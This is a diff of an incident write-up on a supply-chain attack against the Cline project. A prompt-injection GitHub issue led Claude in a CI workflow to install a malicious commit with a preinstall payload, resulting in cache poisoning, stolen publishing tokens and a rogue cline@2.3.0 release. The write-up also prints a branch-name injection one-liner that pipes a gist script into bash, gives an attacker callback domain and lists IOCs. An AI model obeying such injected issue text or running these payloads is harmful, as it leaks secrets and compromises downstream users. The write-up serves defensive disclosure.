@@ -48,8 +48,11 @@ I also [documented my research process](https://mbgsec.com/posts/2026-02-18-rapt
 ## What Actually Happened
 
 **Created**: 2026-02-18
+
 **Published**: 2026-02-19 3AM ET
+
 **Classification**: Supply Chain Attack via Prompt Injection
+
 **Report by**: [Michael Bargury](https://x.com/mbrg0) and [Raptor](https://github.com/gadievron/raptor)
 
 ### Executive Summary
@@ -106,7 +109,7 @@ This payload exploited prompt injection to provide additional instructions to Cl
 Issue 8904 is now deleted.
 I was able to recover it via GH Archive.
 
-### Attack Chain (Cacheract Technique)
+### Attack Chain
 
 1. **Prompt Injection**: Issue title tricks Claude into running `npm install github:cline/cline#<malicious-commit>`
 
@@ -116,7 +119,7 @@ npm install github:cline/cline#b181e045989a73e4f9bd6731b08df66ef1c079ac
 
 The malicious commit [`b181e04`](https://github.com/cline/cline/commit/b181e045989a73e4f9bd6731b08df66ef1c079ac) is hosted on fork `glthub-actions/cline`.
 
-2. **Code Execution**: The malicious commit (`b181e04`) changes `package.json`'s `preinstall` script to grab and execute a payload from `glthub-actions` hosted gist (now deleted)
+2. **Code Execution**: The malicious commit (`b181e04`) changes `package.json`'s `preinstall` script to grab and execute a payload from `glthub-actions` hosted gist.
 
 ```json
 {
@@ -127,11 +130,22 @@ The malicious commit [`b181e04`](https://github.com/cline/cline/commit/b181e0459
   }
 }
 ```
-3. **Cache Poisoning**: Malicious entries injected into GitHub Actions cache via the "Cacheract" technique
+
+This gist and others by `glthub-actions` were deleted. I was unable to recover them.
+
+3. **Cache Poisoning**: Malicious entries injected into GitHub Actions cache via the "[Cacheract](https://github.com/AdnaneKhan/Cacheract)" technique
 4. **Secret Exfiltration**: When the nightly workflow restores the poisoned cache, secrets are leaked (NPM_TOKEN, VSCE_PAT, OVSX_PAT)
+
+The exfiltration payload sends secrets to an attacker-controlled endpoint.
+
+Looking at `glthub-actions`'s commits to their private folks, we spotted this Burp Collaborator address: 
+```bash
+637rio6pykojp15rrkbm4gk960cr0jo8.oastify.com
+```
+
 5. **Supply Chain Attack**: Stolen NPM_TOKEN used to publish malicious cline@2.3.0
 
-### Malicious Package Analysis
+### Malicious Package
 
 **cline@2.3.0** package.json (relevant section):
 
@@ -143,13 +157,13 @@ The malicious commit [`b181e04`](https://github.com/cline/cline/commit/b181e0459
 }
 ```
 
-**Key Observations:**
+**Observations:**
 - The `dist/cli.mjs` binary was **identical** to legitimate v2.2.3 (not modified)
 - Only `package.json` was altered to add the postinstall hook
 - `openclaw` is a legitimate open-source package, **not malware**
 - This is consistent with a PoC demonstration, not a malicious attack
 
-### How the Unknown Attacker Discovered the Vulnerability
+### How the Attacker Discovered the Vulnerability
 
 AdnaneKhan [confirmed](https://x.com/adnanthekhan/status/2024093384558686537): "my test repo was public until recently"
 
@@ -190,18 +204,6 @@ Analyzing `glthub-actions` reveals a second target which exposes them to be a bu
 
 A test repository for New Relic's **Open-source Automation and Contribution (OAC)** workflow pattern. The workflow automatically mirrored external fork PRs into internal branches.
 
-**The Vulnerable Workflow Pattern:**
-1. External contributor opens PR from a fork
-2. Workflow creates a **mirrored internal branch** using the contributor's branch name
-3. Workflow opens an internal PR with the same content
-4. Posts comment: "Your PR has been mirrored to our repository as PR #XX"
-5. Posts trigger comment: "netflix build fork" (intentional typo to prevent accidental triggers)
-
-**Automation accounts involved:**
-- `nr-developer-toolkit` (ID: 62031461) - Branch creation
-- `github-actions[bot]` (ID: 41898282) - PR creation and comments
-- `svc-docs-eng-opensource-bot` - Similar pattern on docs-website
-
 ##### The Vulnerability: Branch Name Command Injection
 
 The workflow interpolated branch names into shell commands without sanitization:
@@ -210,26 +212,21 @@ The workflow interpolated branch names into shell commands without sanitization:
 # Attacker creates branch named:
 {curl,-sSFL,gist.githubusercontent.com/glthub-actions/.../r.sh}${IFS}|${IFS}bash
 
-# When workflow runs something like: git checkout "$BRANCH_NAME"
+# When workflow runs: git checkout "$BRANCH_NAME"
 # Bash brace expansion converts this to: curl -sSFL .../r.sh | bash
 ```
-
-**Technique breakdown:**
-- `{curl,-sSFL,...}` → Bash brace expansion becomes `curl -sSFL ...`
-- `${IFS}` → Internal Field Separator (space) bypasses branch name restrictions
-- `| bash` → Pipes downloaded script to bash for execution
 
 ##### Attack Timeline on NewRelic
 
 | Time (UTC) | Actor | Event |
 |------------|-------|-------|
-| 2026-01-26 11:28 | bhtestacount123 | PR #63 with injection branch `chmod +x myscript.sh` |
-| 2026-01-26 11:36 | bhtestacount123 | PR #64-65 testing continues |
-| 2026-01-27 18:28 | r3s1l3n7 | PR #68 with similar injection pattern |
-| 2026-01-27 19:53 | **glthub-actions** | Created branch with `curl \| bash` payload |
-| 2026-01-27 20:23 | **glthub-actions** | PR #74 closed |
-| 2026-01-27 20:24 | **glthub-actions** | Comment "netlify build fork" (trigger attempt) |
-| 2026-01-27 20:57 | **glthub-actions** | Forked newrelic/test-oac-repository |
+| 2026-01-26 11:28 | `bhtestacount123` | PR #63 with injection branch `chmod +x myscript.sh` |
+| 2026-01-26 11:36 | `bhtestacount123` | PR #64-65 testing continues |
+| 2026-01-27 18:28 | `r3s1l3n7` | PR #68 with similar injection pattern |
+| 2026-01-27 19:53 | **`glthub-actions`** | Created branch with `curl \| bash` payload |
+| 2026-01-27 20:23 | **`glthub-actions`** | PR #74 closed |
+| 2026-01-27 20:24 | **`glthub-actions`** | Comment "netlify build fork" (trigger attempt) |
+| 2026-01-27 20:57 | **`glthub-actions`** | Forked newrelic/test-oac-repository |
 
 We're seeing three different actors using different attack techniques.
 These appear to be **bug bounty hunters** testing the same vulnerability class. 
@@ -255,3 +252,72 @@ Their presence suggests this was a known/discoverable vulnerability pattern.
 
 The attacker tested branch injection on NewRelic, then follow up with prompt injection on Cline the next day. 
 Vuln hunting across GitHub Actions workflows seems to be their thing.
+
+## IOCs
+
+```json
+{
+  "threat_actor": "glthub-actions",
+  "attribution": "Unknown threat actor, NOT AdnaneKhan (confirmed)",
+  "iocs": [
+    {
+      "type": "github_username",
+      "value": "glthub-actions",
+      "context": "Typosquat attack account (lowercase L mimics 'github-actions')",
+      "actor_id": 256690727,
+      "status": "deleted/suspended"
+    },
+    {
+      "type": "email",
+      "value": "sec@w00.sh",
+      "context": "Email used in malicious commits to glthub-actions/cline fork"
+    },
+    {
+      "type": "domain",
+      "value": "w00.sh",
+      "context": "Domain associated with attacker email"
+    },
+    {
+      "type": "domain",
+      "value": "637rio6pykojp15rrkbm4gk960cr0jo8.oastify.com",
+      "context": "Burp Collaborator callback used by glthub-actions on Jan 26, 2026",
+      "evidence": "GH Archive"
+    },
+    {
+      "type": "github_issue",
+      "value": "cline/cline#8904",
+      "context": "Prompt injection issue created by glthub-actions",
+      "evidence": "GH Archive"
+    },
+    {
+      "type": "commit_sha",
+      "value": "b181e045989a73e4f9bd6731b08df66ef1c079ac",
+      "context": "Malicious commit referenced in prompt injection payload"
+    },
+    {
+      "type": "gist",
+      "value": "77f1c20a43be8f8bd047f31dce427207",
+      "context": "Deleted gist containing malicious payload (r.sh) - used in branch name injection",
+      "status": "deleted"
+    },
+    {
+      "type": "gist",
+      "value": "7b3f87dac75ef2249adeb6bdbc9ee3f1",
+      "context": "Deleted gist containing run.sh payload - RECOVERED via preserved commits",
+      "status": "deleted"
+    },
+    {
+      "type": "gist",
+      "value": "148eccfabb6a2c7410c6e2f2adee7889",
+      "context": "Deleted gist containing run.sh payload (alternate)",
+      "status": "deleted"
+    },
+    {
+      "type": "gist",
+      "value": "4f746a77ff66040b9b45c477d1be9295",
+      "context": "Deleted gist containing run.sh payload (alternate)",
+      "status": "deleted"
+    }
+  ]
+}
+```
